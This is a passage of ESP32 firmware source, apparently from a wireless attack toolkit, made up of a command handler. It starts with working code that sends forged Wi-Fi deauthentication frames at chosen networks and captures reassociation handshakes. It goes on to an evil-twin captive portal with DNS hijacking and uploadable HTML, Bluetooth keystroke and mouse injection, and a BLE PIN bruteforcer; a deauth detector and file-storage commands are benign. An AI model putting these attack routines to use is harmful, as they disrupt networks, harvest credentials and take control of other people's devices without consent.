        uint8_t  channel    = args["channel"].as<uint8_t>() ? args["channel"].as<uint8_t>() : 1;
        if (!isValidWifiChannel(channel)) {
            proto.sendResp(id, false, "invalid channel");
            return;
        }
        String regulatoryError;
        if (!validateRegulatoryChannel(channel, regulatoryError)) {
            proto.sendResp(id, false, regulatoryError.c_str());
            return;
        }
        uint16_t count      = args["count"].as<uint16_t>() ? args["count"].as<uint16_t>() : 1;
        uint16_t intervalMs = 20;
        if (args.containsKey("deauth_interval_ms")) {
            intervalMs = args["deauth_interval_ms"].as<uint16_t>();
        } else if (args.containsKey("interval")) {
            intervalMs = args["interval"].as<uint16_t>();
        }
        uint8_t reason = args["reason"].as<uint8_t>() ? args["reason"].as<uint8_t>() : 7;
        bool allBeacons = args["all_beacons"] | true;

        JsonArray targets = args["targets"].as<JsonArray>();

        radioIdle();
        esp_err_t setupErr = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
        if (setupErr != ESP_OK) {
            String msg = "channel set failed: ";
            msg += esp_err_to_name(setupErr);
            proto.sendResp(id, false, msg.c_str());
            return;
        }

        wifi_config_t ap_cfg = {};
        setupErr = esp_wifi_get_config(WIFI_IF_AP, &ap_cfg);
        if (setupErr == ESP_OK) {
            ap_cfg.ap.channel = channel;
            setupErr = esp_wifi_set_config(WIFI_IF_AP, &ap_cfg);
        }
        if (setupErr != ESP_OK) {
            String msg = "AP channel sync failed: ";
            msg += esp_err_to_name(setupErr);
            proto.sendResp(id, false, msg.c_str());
            return;
        }

        setupErr = esp_wifi_start();
        if (setupErr != ESP_OK && setupErr != ESP_ERR_WIFI_STATE) {
            String msg = "WiFi start failed: ";
            msg += esp_err_to_name(setupErr);
            proto.sendResp(id, false, msg.c_str());
            return;
        }
        delay(180);

        // Start capture before transmitting so the reassociation M1/M2 exchange
        // is not missed. Beacon capture is de-duplicated per BSSID in Sniffer.
        sniffer.setEapolFilter(true, nullptr, allBeacons);
        if (!sniffer.startFixed(channel, allow5ghz)) {
            proto.sendResp(id, false, "capture start failed for channel");
            return;
        }
        delay(60);

        uint32_t totalSent = 0;
        uint32_t totalFailed = 0;
        uint16_t targetsHit = 0;
        uint32_t requestedFrames = 0;

        for (JsonVariant t : targets) {
            const char* bssidStr  = t["bssid"] | "";
            const char* clientStr = t["client"] | "FF:FF:FF:FF:FF:FF";

            uint8_t bssid[6] = {0};
            uint8_t client[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
            if (!parseMac(bssidStr, bssid)) continue;
            parseMac(clientStr, client);

            uint8_t deauth_frame[26] = {
                0xC0, 0x00, 0x00, 0x00,
                0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,   // Addr1 (client)
                0x00,0x00,0x00,0x00,0x00,0x00,   // Addr2 (BSSID)
                0x00,0x00,0x00,0x00,0x00,0x00,   // Addr3 (BSSID)
                0x00, 0x00, 0x00, 0x07            // Seq + reason
            };
            memcpy(deauth_frame + 4, client, 6);
            memcpy(deauth_frame + 10, bssid, 6);
            memcpy(deauth_frame + 16, bssid, 6);

            uint16_t seq = 0x0010;
            requestedFrames += count;
            for (uint16_t i = 0; i < count; i++) {
                deauth_frame[22] = seq & 0xFF;
                deauth_frame[23] = (seq >> 8) & 0xFF;
                deauth_frame[25] = reason;
                if (esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, 26, true) == ESP_OK) {
                    totalSent++;
                } else {
                    totalFailed++;
                }
                seq += 0x0010;
                delay(intervalMs);
            }
            targetsHit++;
        }

        JsonDocument resp;
        resp["ok"]              = targetsHit > 0;
        resp["msg"]             = targetsHit > 0
            ? "channel deauth capture started"
            : "no valid deauth targets";
        resp["band"]            = wifiBandModeName(bandMode);
        resp["channel"]         = channel;
        resp["targets"]         = targetsHit;
        resp["requested_frames"] = requestedFrames;
        resp["sent_frames"]     = totalSent;
        resp["failed_frames"]   = totalFailed;
        resp["interval_ms"]     = intervalMs;
        resp["reason"]          = reason;
        String json; serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
    }

    // ── DEAUTH DETECTOR ───────────────────────────────────────────────────
    else if (strcmp(cmd, "DEAUTH_DETECT_START") == 0) {
        radioIdle();

        const char* band = doc["args"]["band"] | "auto";
        WifiBandMode bandMode = WifiBandMode::BAND_2G;
        String bandError;
        if (!configureWifiBand(band, bandMode, bandError)) {
            proto.sendResp(id, false, bandError.c_str());
            return;
        }

        DeauthDetectConfig cfg;
        const char* mode = doc["args"]["mode"] | "fixed";
        cfg.hop = (strcmp(mode, "hop") == 0) || (doc["args"]["hop"] | false);
        cfg.include5ghz = bandMode != WifiBandMode::BAND_2G;
        cfg.channel = doc["args"]["channel"] | 1;
        cfg.intervalMs = doc["args"]["interval_ms"] | 300;
        if (!cfg.hop) {
            String regulatoryError;
            if (!validateRegulatoryChannel(cfg.channel, regulatoryError)) {
                proto.sendResp(id, false, regulatoryError.c_str());
                return;
            }
        }

        const char* bssidStr = doc["args"]["bssid"] | "";
        uint8_t bssid[6];
        if (parseMac(bssidStr, bssid)) {
            cfg.hasBssid = true;
            memcpy(cfg.bssid, bssid, 6);
        }

        const char* clientStr = doc["args"]["client"] | "";
        uint8_t client[6];
        if (parseMac(clientStr, client)) {
            cfg.hasClient = true;
            memcpy(cfg.client, client, 6);
        }

        int rssiMin = doc["args"]["rssi_min"] | -127;
        cfg.rssiMin = (int8_t)constrain(rssiMin, -127, 0);

        bool ok = deauthDetector.start(cfg);
        if (!ok) {
            proto.sendResp(id, false, "invalid channel (must be 1-14)");
        } else {
            JsonDocument resp;
            resp["ok"]      = true;
            resp["channel"] = deauthDetector.channel();
            resp["hopping"] = deauthDetector.hopping();
            String json; serializeJson(resp, json);
            proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
        }
    }

    else if (strcmp(cmd, "DEAUTH_DETECT_STOP") == 0) {
        DeauthDetectStats s = deauthDetector.stats();
        deauthDetector.stop();
        JsonDocument resp;
        resp["ok"]       = true;
        resp["detected"] = s.detected;
        resp["sent"]     = s.sent;
        resp["dropped"]  = s.dropped;
        String json; serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
    }

    else if (strcmp(cmd, "DEAUTH_DETECT_STATUS") == 0) {
        DeauthDetectStats s = deauthDetector.stats();
        JsonDocument resp;
        resp["ok"]       = true;
        resp["active"]   = deauthDetector.active();
        resp["hopping"]  = deauthDetector.hopping();
        resp["channel"]  = deauthDetector.channel();
        resp["detected"] = s.detected;
        resp["sent"]     = s.sent;
        resp["dropped"]  = s.dropped;
        String json; serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
    }

#if NRSUITE_ENABLE_PORTAL
    // ── CAPTIVE PORTAL ────────────────────────────────────────────────────
    else if (strcmp(cmd, "START_PORTAL") == 0) {
        radioIdle();  // stop sniff / beacon / prior portal before starting

        const char* band = doc["args"]["band"] | "auto";
        WifiBandMode bandMode = WifiBandMode::BAND_2G;
        String bandError;
        if (!configureWifiBand(band, bandMode, bandError)) {
            proto.sendResp(id, false, bandError.c_str());
            return;
        }

        const char* ssid = doc["args"]["ssid"] | "Home Network";
        uint8_t channel = doc["args"]["channel"] | 6;
        if (!isValidWifiChannel(channel)) {
            JsonDocument resp;
            resp["ok"] = false;
            resp["error"] = "invalid_channel";
            resp["msg"] = "invalid channel";
            resp["channel"] = channel;
            String json; serializeJson(resp, json);
            proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
            return;
        }
        String regulatoryError;
        if (!validateRegulatoryChannel(channel, regulatoryError)) {
            char cc[4] = {0};
            esp_wifi_get_country_code(cc);
            JsonDocument resp;
            resp["ok"] = false;
            resp["error"] = "regulatory_channel_blocked";
            resp["msg"] = regulatoryError;
            resp["channel"] = channel;
            resp["country"] = cc[0] ? cc : "CH";
            appendAllowedWifiChannels(resp);
            String json; serializeJson(resp, json);
            proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
            return;
        }
        const char* bssidStr = doc["args"]["bssid"] | "";
        const bool showNotice = doc["args"]["show_notice"] | true;
        const bool dnsHijackEnabled = doc["args"]["dns_hijack"] | true;

        uint8_t targetBssid[6] = {0};
        bool hasTarget = parseMac(bssidStr, targetBssid);

        String portalError;
        bool started = portal.start(
            ssid,
            channel,
            hasTarget ? targetBssid : nullptr,
            showNotice,
            &portalError,
            dnsHijackEnabled
        );
        if (started) {
            JsonDocument resp;
            resp["ok"] = true;
            resp["msg"] = "portal started";
            resp["capture_active"] = portal.isCaptureActive();
            resp["capture_target"] = portal.hasCaptureTarget();
            resp["dns_up"] = portal.isDnsActive();
            resp["clients"] = portal.stationCount();
            String json; serializeJson(resp, json);
            proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
        } else {
            const bool captureFailure = portalError.indexOf("capture") >= 0;
            JsonDocument resp;
            resp["ok"] = false;
            resp["error"] = captureFailure ? "capture_start_failed" : "softap_start_failed";
            resp["msg"] = portalError.length() ? portalError : "softAP failed";
            resp["channel"] = channel;
            appendAllowedWifiChannels(resp);
            String json; serializeJson(resp, json);
            proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
        }
    }

    else if (strcmp(cmd, "STOP_PORTAL") == 0) {
        portal.stop();
        proto.sendResp(id, true);
    }

    else if (strcmp(cmd, "RESET_HTML") == 0) {
        size_t expectedSize = doc["args"]["size"] | 0;
        bool ok = portal.resetHtml(expectedSize);

        JsonDocument ev;
        ev["type"]      = "html_reset";
        ev["expected"]  = expectedSize;
        ev["ok"]        = ok;
        ev["free_heap"] = ESP.getFreeHeap();
        proto.sendEvent("debug", ev);

        proto.sendResp(id, ok);
    }


    else if (strcmp(cmd, "SET_HTML_CHUNK") == 0) {

        const char* b64data = doc["args"]["data"] | (const char*)nullptr;
        bool last           = doc["args"]["last"]  | false;
        const bool hasOffset = !doc["args"]["offset"].isNull();
        const size_t offset = hasOffset ? doc["args"]["offset"].as<size_t>() : 0;

        if (!b64data) {
            JsonDocument ev;
            ev["type"] = "html_chunk_rejected";
            ev["reason"] = "missing_data";
            ev["offset"] = offset;
            proto.sendEvent("debug", ev);
            proto.sendResp(id, false, "missing data");
            return;
        }

        size_t b64len = strlen(b64data);
        size_t outCap = ((b64len + 3) / 4) * 3 + 2;

        // Use heap, not stack
        uint8_t* outBuf = (uint8_t*)heap_caps_malloc(outCap, MALLOC_CAP_8BIT);
        if (!outBuf) {
            JsonDocument ev;
            ev["type"] = "html_chunk_rejected";
            ev["reason"] = "oom";
            ev["offset"] = offset;
            proto.sendEvent("debug", ev);
            proto.sendResp(id, false, "oom");
            return;
        }

        size_t outLen = 0;
        int ret = mbedtls_base64_decode(outBuf, outCap, &outLen,
                                        (const unsigned char*)b64data, b64len);
        if (ret == 0) {
            const bool accepted = portal.setHtmlChunk(outBuf, outLen, last, offset, hasOffset);

            JsonDocument ev;
            ev["type"]          = accepted ? "html_chunk" : "html_chunk_rejected";
            ev["offset"]        = offset;
            ev["len"]           = outLen;
            ev["last"]          = last;
            ev["accepted"]      = accepted;
            ev["html_size"]     = portal.getBufferSize();
            ev["html_expected"] = portal.getExpectedSize();
            ev["complete"]      = portal.isComplete();
            proto.sendEvent("debug", ev);

            if (accepted) {
                proto.sendResp(id, true);
            } else {
                proto.sendResp(id, false, "html chunk rejected");
            }
        } else {
            char msg[40];
            snprintf(msg, sizeof(msg), "b64 fail ret=%d", ret);

            JsonDocument ev;
            ev["type"]   = "html_chunk_rejected";
            ev["reason"] = "decode_failed";
            ev["ret"]    = ret;
            ev["offset"] = offset;
            ev["len"]    = b64len;
            proto.sendEvent("debug", ev);

            proto.sendResp(id, false, "decode failed");
        }

        heap_caps_free(outBuf);
    }

    else if (strcmp(cmd, "PORTAL_STATUS") == 0) {
        JsonDocument resp;
        resp["ok"] = true;
        resp["running"] = portal.isRunning();
        resp["html_size"] = portal.getBufferSize();
        resp["html_expected"] = portal.getExpectedSize();
        resp["html_complete"] = portal.isComplete();
        resp["capture_active"] = portal.isCaptureActive();
        resp["capture_target"] = portal.hasCaptureTarget();
        resp["dns_up"] = portal.isDnsActive();
        resp["clients"] = portal.stationCount();
        String json; serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
    }
#endif
    #ifdef ENABLE_BLE_HID
    else if (strcmp(cmd, "BLE_SCAN_START") == 0) {
        mesh.stop();
        if (BleHid::isAdvertising() || BleHid::isConnected()) {
            proto.sendResp(id, false, "stop BLE HID before starting BLE scan");
        } else if (bleProfile.active()) {
            proto.sendResp(id, false, "stop BLE profile before starting BLE scan");
        } else {
            bool active = doc["args"]["active"] | true;
            uint16_t interval = doc["args"]["interval_ms"] | 100;
            uint16_t window = doc["args"]["window_ms"] | 99;
            uint32_t minEmit = doc["args"]["min_emit_ms"] | 1000;
            bool ok = bleScanner.start(active, interval, window, minEmit);
            proto.sendResp(id, ok, ok ? "ble scan started" : "failed to start ble scan");
        }
    }

    else if (strcmp(cmd, "BLE_SCAN_STOP") == 0) {
        bleScanner.stop();
        proto.sendResp(id, true, "ble scan stopped");
    }

    else if (strcmp(cmd, "BLE_PROFILE_START") == 0) {
        mesh.stop();
        const char* address = doc["args"]["address"] | "";
        uint8_t addressType = doc["args"]["address_type"] | 0;
        if (BleHid::isAdvertising() || BleHid::isConnected()) {
            proto.sendResp(id, false, "stop BLE HID before starting BLE profile");
        } else if (bleScanner.active()) {
            proto.sendResp(id, false, "stop BLE scan before starting BLE profile");
        } else {
            bool ok = bleProfile.start(address, addressType);
            proto.sendResp(id, ok, ok ? "ble profile started" : "failed to start ble profile");
        }
    }

    else if (strcmp(cmd, "BLE_PROFILE_STOP") == 0) {
        bleProfile.stop();
        proto.sendResp(id, true, "ble profile stopping");
    }

    else if (strcmp(cmd, "BLE_START") == 0) {
        mesh.stop();
        if (blePinBruteforce.active()) {
            proto.sendResp(id, false, "stop BLE PIN bruteforce before starting BLE HID");
        } else if (bleScanner.active()) {
            proto.sendResp(id, false, "stop BLE scan before starting BLE HID");
        } else if (bleProfile.active()) {
            proto.sendResp(id, false, "stop BLE profile before starting BLE HID");
        } else {
            // NimBLE + HID needs roughly 65-70 KB on C3-class targets. Starting
            // with less has been observed to exhaust the heap and reset the
            // USB device. Refuse before allocation instead of crashing.
            #ifdef NRSUITE_BLE_HID_MIN_FREE_HEAP_BYTES
            constexpr uint32_t BLE_HID_MIN_FREE_HEAP = NRSUITE_BLE_HID_MIN_FREE_HEAP_BYTES;
            #else
            constexpr uint32_t BLE_HID_MIN_FREE_HEAP = 90 * 1024;
            #endif
            #ifdef NRSUITE_BLE_HID_MIN_LARGEST_BLOCK_BYTES
            constexpr uint32_t BLE_HID_MIN_LARGEST_BLOCK = NRSUITE_BLE_HID_MIN_LARGEST_BLOCK_BYTES;
            #else
            constexpr uint32_t BLE_HID_MIN_LARGEST_BLOCK = 48 * 1024;
            #endif
            #ifdef NRSUITE_BLE_HEAP_DIAGNOSTIC
            sendBleHeapDiagnostic("ble_start_before_guard");
            #endif
            const uint32_t freeHeap = ESP.getFreeHeap();
            const uint32_t largestBlock = ESP.getMaxAllocHeap();
            if (!BleHid::isInitialized() &&
                (freeHeap < BLE_HID_MIN_FREE_HEAP ||
                 largestBlock < BLE_HID_MIN_LARGEST_BLOCK)) {
                char message[96];
                snprintf(
                    message,
                    sizeof(message),
                    "insufficient heap for BLE HID (free=%lu largest=%lu)",
                    static_cast<unsigned long>(freeHeap),
                    static_cast<unsigned long>(largestBlock));
                JsonDocument resp;
                resp["ok"] = false;
                resp["error"] = "insufficient_heap_for_ble_hid";
                resp["msg"] = message;
                resp["heap"] = freeHeap;
                resp["heap_max_alloc"] = largestBlock;
                resp["required_heap"] = BLE_HID_MIN_FREE_HEAP;
                resp["required_largest_block"] = BLE_HID_MIN_LARGEST_BLOCK;
                resp["transport"] = proto.activeTransportName();
                String json;
                serializeJson(resp, json);
                proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
                return;
            }
            #ifdef NRSUITE_BLE_HEAP_DIAGNOSTIC
            sendBleHeapDiagnostic("ble_start_before_radio_idle");
            #endif
            radioIdle();
            #ifdef NRSUITE_BLE_HEAP_DIAGNOSTIC
            sendBleHeapDiagnostic("ble_start_after_radio_idle");
            sendBleHeapDiagnostic("ble_start_before_begin");
            #endif
            const char* name = doc["args"]["name"] | "NRSuite_Keyboard";
            BleHid::begin(String(name));
            #ifdef NRSUITE_BLE_HEAP_DIAGNOSTIC
            sendBleHeapDiagnostic("ble_start_after_begin");
            #endif
            proto.sendResp(id, true, "ble started");
        }
    }

    else if (strcmp(cmd, "BLE_STATUS") == 0) {
        JsonDocument resp;
        resp["ok"]          = true; 
        resp["connected"]   = BleHid::isConnected();
        resp["linked"]      = BleHid::isLinkConnected();
        resp["active"]      = BleHid::isSessionActive();
        resp["advertising"] = BleHid::isAdvertising();   // ← NEW
        resp["peer"]        = BleHid::peerAddress();
        String json; serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
    }

    else if (strcmp(cmd, "BLE_STOP") == 0) {
        #ifdef NRSUITE_BLE_HEAP_DIAGNOSTIC
        sendBleHeapDiagnostic("ble_stop_before_end");
        #endif
        BleHid::end();
        #ifdef NRSUITE_BLE_HEAP_DIAGNOSTIC
        sendBleHeapDiagnostic("ble_stop_after_end");
        #endif
        blePinBruteforce.onBleEnded();
        proto.sendResp(id, true, "ble stopped");
    }

    else if (strcmp(cmd, "BLE_RUN_SCRIPT") == 0) {
        const char* script = doc["args"]["script"] | "";
        if (script[0] == '\0') {
            proto.sendResp(id, false, "missing script");
        } else if (!BleHid::isConnected()) {
            proto.sendResp(id, false, "not paired");
        } else {
            int lines = BleHid::runScript(String(script));
            JsonDocument resp;
            resp["ok"]    = true;
            resp["lines"] = lines;
            String json; serializeJson(resp, json);
            proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
        }
    }

    else if (strcmp(cmd, "BLE_STOP_SCRIPT") == 0) {
        BleHid::stop();
        proto.sendResp(id, true, "script stopped");
    }

    else if (strcmp(cmd, "BLE_KEY_DOWN") == 0) {
        const char* key = doc["args"]["key"] | "";
        if (key[0] == '\0' || !BleHid::isConnected()) {
            proto.sendResp(id, false, key[0] == '\0' ? "missing key" : "not paired");
        } else {
            BleHid::keyDown(String(key));
            proto.sendResp(id, true);
        }
    }

    else if (strcmp(cmd, "BLE_KEY_UP") == 0) {
        const char* key = doc["args"]["key"] | "";
        if (key[0] == '\0' || !BleHid::isConnected()) {
            proto.sendResp(id, false, key[0] == '\0' ? "missing key" : "not paired");
        } else {
            BleHid::keyUp(String(key));
            proto.sendResp(id, true);
        }
    }

    else if (strcmp(cmd, "BLE_KEY_TAP") == 0) {
        const char* key = doc["args"]["key"] | "";
        if (key[0] == '\0' || !BleHid::isConnected()) {
            proto.sendResp(id, false, key[0] == '\0' ? "missing key" : "not paired");
        } else {
            BleHid::tapKey(String(key));
            proto.sendResp(id, true);
        }
    }

    else if (strcmp(cmd, "BLE_TYPE_TEXT") == 0) {
        const char* text = doc["args"]["text"] | "";
        if (!BleHid::isConnected()) {
            proto.sendResp(id, false, "not paired");
        } else {
            size_t written = BleHid::typeText(String(text));
            if (written == 0 && text[0] != '\0') {
                proto.sendResp(id, false, "no supported characters");
            } else {
                proto.sendResp(id, true);
            }
        }
    }

    else if (strcmp(cmd, "BLE_MOUSE_MOVE") == 0) {
        if (!BleHid::isConnected()) {
            proto.sendResp(id, false, "not paired");
        } else {
            int dx = doc["args"]["dx"] | 0;
            int dy = doc["args"]["dy"] | 0;
            BleHid::mouseMove(dx, dy);
            proto.sendResp(id, true);
        }
    }

    else if (strcmp(cmd, "BLE_MOUSE_SCROLL") == 0) {
        if (!BleHid::isConnected()) {
            proto.sendResp(id, false, "not paired");
        } else {
            int wheel = doc["args"]["wheel"] | 0;
            BleHid::mouseScroll(wheel);
            proto.sendResp(id, true);
        }
    }

    else if (strcmp(cmd, "BLE_MOUSE_BUTTON") == 0) {
        const char* button = doc["args"]["button"] | "";
        bool down = doc["args"]["down"] | false;
        if (button[0] == '\0' || !BleHid::isConnected()) {
            proto.sendResp(id, false, button[0] == '\0' ? "missing button" : "not paired");
        } else {
            BleHid::mouseButton(String(button), down);
            proto.sendResp(id, true);
        }
    }

    else if (strcmp(cmd, "BLE_MOUSE_RELEASE") == 0) {
        if (!BleHid::isConnected()) {
            proto.sendResp(id, false, "not paired");
        } else {
            BleHid::mouseReleaseAll();
            proto.sendResp(id, true);
        }
    }

    else if (strcmp(cmd, "BLE_RELEASE_ALL") == 0) {
        BleHid::releaseAll();
        proto.sendResp(id, true);
    }

    // ── BLE HID PIN BRUTEFORCE ────────────────────────────────────────────
    else if (strcmp(cmd, "BLE_PIN_ADVERTISE_START") == 0) {
        if (bleScanner.active()) {
            proto.sendResp(id, false, "stop BLE scan before starting BLE PIN");
        } else if (bleProfile.active()) {
            proto.sendResp(id, false, "stop BLE profile before starting BLE PIN");
        } else {
            radioIdle();
            String error;
            bool ok = blePinBruteforce.advertiseStart(doc["args"], error);
            proto.sendResp(id, ok, ok ? "ble pin advertising started" : error.c_str());
        }
    }

    else if (strcmp(cmd, "BLE_PIN_ADVERTISE_STOP") == 0) {
        String error;
        bool ok = blePinBruteforce.advertiseStop(error);
        proto.sendResp(id, ok, ok ? "ble pin advertising stopped" : error.c_str());
    }

    else if (strcmp(cmd, "BLE_PIN_START") == 0) {
        String error;
        bool ok = blePinBruteforce.start(doc["args"], error);
        proto.sendResp(id, ok, ok ? "ble pin started" : error.c_str());
    }

    else if (strcmp(cmd, "BLE_PIN_PAUSE") == 0) {
        String error;
        bool ok = blePinBruteforce.pause(error);
        proto.sendResp(id, ok, ok ? "ble pin paused" : error.c_str());
    }

    else if (strcmp(cmd, "BLE_PIN_RESUME") == 0) {
        String error;
        bool ok = blePinBruteforce.resume(error);
        proto.sendResp(id, ok, ok ? "ble pin resumed" : error.c_str());
    }

    else if (strcmp(cmd, "BLE_PIN_STOP") == 0) {
        String error;
        bool ok = blePinBruteforce.stop(error);
        proto.sendResp(id, ok, ok ? "ble pin stopped" : error.c_str());
    }

    else if (strcmp(cmd, "BLE_PIN_NEXT") == 0) {
        String error;
        bool ok = blePinBruteforce.nextAttempt(error);
        proto.sendResp(id, ok, ok ? "ble pin skipped" : error.c_str());
    }

    else if (strcmp(cmd, "BLE_PIN_PREV") == 0) {
        String error;
        bool ok = blePinBruteforce.previousAttempt(error);
        proto.sendResp(id, ok, ok ? "ble pin moved back" : error.c_str());
    }

    else if (strcmp(cmd, "BLE_PIN_CLEAR") == 0) {
        bool clearWordlist = doc["args"]["wordlist"] | false;
        String error;
        bool ok = blePinBruteforce.clear(clearWordlist, error);
        proto.sendResp(id, ok, ok ? "ble pin cleared" : error.c_str());
    }

    else if (strcmp(cmd, "BLE_PIN_STATUS") == 0) {
        JsonDocument resp;
        resp["ok"] = true;
        blePinBruteforce.status(resp);
        String json;
        serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
    }

    else if (strcmp(cmd, "BLE_PIN_FORGET_BOND") == 0) {
        String error;
        bool ok = blePinBruteforce.forgetBond(error);
        proto.sendResp(id, ok, ok ? "ble pin bond cleared" : error.c_str());
    }

    else if (strcmp(cmd, "BLE_PIN_DISCONNECT") == 0) {
        String error;
        bool ok = blePinBruteforce.disconnectPeer(error);
        proto.sendResp(id, ok, ok ? "ble pin disconnect requested" : error.c_str());
    }

    else if (strcmp(cmd, "BLE_PIN_WORDLIST_RESET") == 0) {
        String error;
        bool ok = pinBruteforce.beginWordlistUpload(error);
        proto.sendResp(id, ok, ok ? "ble pin wordlist upload ready" : error.c_str());
    }

    else if (strcmp(cmd, "BLE_PIN_WORDLIST_CHUNK") == 0) {
        const char* b64data = doc["args"]["data"] | (const char*)nullptr;
        bool last = doc["args"]["last"] | false;
        uint32_t offset = doc["args"]["offset"] | 0;
        uint32_t checksum = doc["args"]["checksum"] | 0;
        if (!b64data) {
            proto.sendResp(id, false, "missing data");
            return;
        }
        size_t b64len = strlen(b64data);
        size_t outCap = ((b64len + 3) / 4) * 3 + 2;
        uint8_t* outBuf = (uint8_t*)heap_caps_malloc(outCap, MALLOC_CAP_8BIT);
        if (!outBuf) {
            proto.sendResp(id, false, "oom");
            return;
        }
        size_t outLen = 0;
        int ret = mbedtls_base64_decode(outBuf, outCap, &outLen,
                                        (const unsigned char*)b64data, b64len);
        String error;
        bool ok = false;
        if (ret == 0) {
            ok = pinBruteforce.addWordlistChunk(outBuf, outLen, offset, checksum, last, error);
        } else {
            error = "decode failed";
        }
        heap_caps_free(outBuf);
        proto.sendResp(id, ok, ok ? (last ? "ble pin wordlist saved" : "chunk ok") : error.c_str());
    }
    #endif

    else if (strcmp(cmd, "START_MSC") == 0) {
        #if defined(CONFIG_IDF_TARGET_ESP32S2) || defined(CONFIG_IDF_TARGET_ESP32S3)
            proto.sendResp(id, true, "rebooting into mass storage mode");
            delay(100);
            Preferences prefs;
            prefs.begin("boot", false);
            prefs.putBool("msc_mode", true);
            prefs.end();
            proto.sendResp(id, true, "rebooting into mass storage mode");
            delay(100);
            esp_restart();
        #else
            proto.sendResp(id, false, "mass storage not supported on this chip");
        #endif
    }
    
    else if (strcmp(cmd, "MSC_LIST") == 0) {
        #if MSC_SUPPORTED
            String listing;
            if (!MassStorage::listFiles(listing)) {
                proto.sendResp(id, false, "failed to list files");
            } else {
                uint64_t total = 0, used = 0, free = 0;
                MassStorage::getSpace(total, used, free);

                JsonDocument resp;
                resp["ok"] = true;

                // Parse "name\tsize\n..." into a files array so the client
                // doesn't have to do its own string parsing.
                JsonArray files = resp["files"].to<JsonArray>();
                int start = 0;
                while (start < listing.length()) {
                    int lineEnd = listing.indexOf('\n', start);
                    if (lineEnd == -1) break;
                    String line = listing.substring(start, lineEnd);
                    int tab = line.indexOf('\t');
                    if (tab != -1) {
                        JsonObject f = files.add<JsonObject>();
                        f["name"] = line.substring(0, tab);
                        f["size"] = line.substring(tab + 1).toInt();
                    }
                    start = lineEnd + 1;
                }

                resp["total"] = total;
                resp["used"]  = used;
                resp["free"]  = free;

                String json; serializeJson(resp, json);
                proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
            }
        #else
            proto.sendResp(id, false, "storage not supported on this chip");
        #endif
    }

    else if (strcmp(cmd, "MSC_READ") == 0) {
        #if MSC_SUPPORTED
            const char* path = doc["args"]["path"] | "";
            if (path[0] == '\0') {
                proto.sendResp(id, false, "missing path");
            } else {
                const bool chunked = !doc["args"]["offset"].isNull() ||
                                     !doc["args"]["length"].isNull() ||
                                     !doc["args"]["limit"].isNull();
                if (chunked) {
                    size_t offset = doc["args"]["offset"] | 0;
                    size_t limit  = doc["args"]["length"] | (doc["args"]["limit"] | 0);
                    if (limit == 0) limit = 512;
                    if (limit > 768) limit = 768;

                    String content;
                    size_t total = 0;
                    bool eof = false;
                    if (!MassStorage::readFileChunk(path, offset, limit, content, total, eof)) {
                        proto.sendResp(id, false, "failed to read file chunk");
                    } else {
                        JsonDocument resp;
                        resp["ok"]      = true;
                        resp["path"]    = path;
                        resp["content"] = content;
                        resp["size"]    = content.length();
                        resp["offset"]  = offset;
                        resp["total"]   = total;
                        resp["eof"]     = eof;
                        String json; serializeJson(resp, json);
                        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
                    }
                } else {
                    String content;
                    if (!MassStorage::readFile(path, content)) {
                        proto.sendResp(id, false, "failed to read file");
                    } else {
                        JsonDocument resp;
                        resp["ok"]      = true;
                        resp["path"]    = path;
                        resp["content"] = content;
                        resp["size"]    = content.length();
                        resp["offset"]  = 0;
                        resp["total"]   = content.length();
                        resp["eof"]     = true;
                        String json; serializeJson(resp, json);
                        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
                    }
                }
            }
        #else
            proto.sendResp(id, false, "storage not supported on this chip");
        #endif
    }

    else if (strcmp(cmd, "MSC_WRITE") == 0) {
        #if MSC_SUPPORTED
            const char* path    = doc["args"]["path"] | "";
            const char* content = doc["args"]["content"] | "";
            bool append         = doc["args"]["append"] | false;

            if (path[0] == '\0') {
                proto.sendResp(id, false, "missing path");
            } else if (!MassStorage::writeFile(path, String(content), append)) {
                proto.sendResp(id, false, "failed to write file");
            } else {
                proto.sendResp(id, true, append ? "appended" : "written");
            }
        #else
            proto.sendResp(id, false, "storage not supported on this chip");
        #endif
    }

    else if (strcmp(cmd, "MSC_DELETE") == 0) {
        #if MSC_SUPPORTED
            const char* path = doc["args"]["path"] | "";
            if (path[0] == '\0') {
                proto.sendResp(id, false, "missing path");
            } else if (!MassStorage::deleteFile(path)) {
                proto.sendResp(id, false, "failed to delete file");
            } else {
                proto.sendResp(id, true, "deleted");
            }
        #else
            proto.sendResp(id, false, "storage not supported on this chip");
        #endif
    }

    else if (strcmp(cmd, "MSC_SPACE") == 0) {
        #if MSC_SUPPORTED
            uint64_t total = 0, used = 0, free = 0;
            if (!MassStorage::getSpace(total, used, free)) {
                proto.sendResp(id, false, "failed to get space info");
            } else {
                JsonDocument resp;
                resp["ok"]    = true;
                resp["total"] = total;
                resp["used"]  = used;
                resp["free"]  = free;
                String json; serializeJson(resp, json);
                proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
            }
        #else
            proto.sendResp(id, false, "storage not supported on this chip");
        #endif
    }

    else if (strcmp(cmd, "MSC_SETUP") == 0) {
        #if MSC_SUPPORTED
